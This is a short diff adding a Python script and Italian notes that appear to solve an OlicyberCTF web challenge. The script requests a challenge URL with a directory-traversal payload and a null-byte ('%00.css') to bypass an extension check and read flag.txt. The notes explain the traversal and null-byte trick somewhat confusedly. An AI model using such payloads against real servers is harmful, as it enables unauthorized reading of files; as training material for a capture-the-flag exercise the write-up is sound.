@@ -1,0 +1,13 @@
+import requests
+u='http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css'
+r=requests.get(u)
+print(r.text)
+
+
+
+La sequenza ../.../.../.../... è un tentativo di directory traversal (traversata di directory). In pratica, questa tecnica viene utilizzata per navigare tra le cartelle del sistema di file di un server. Vediamo come funziona in dettaglio:
+
+.. è un riferimento alla cartella superiore (o "parent directory"). Quindi, quando si scrive ../, si sta dicendo "vai alla cartella superiore rispetto alla cartella corrente".
+
+
+%00 serve per interrompere la lettura quindi è come se legge solo.css entrando cosi nel primo if
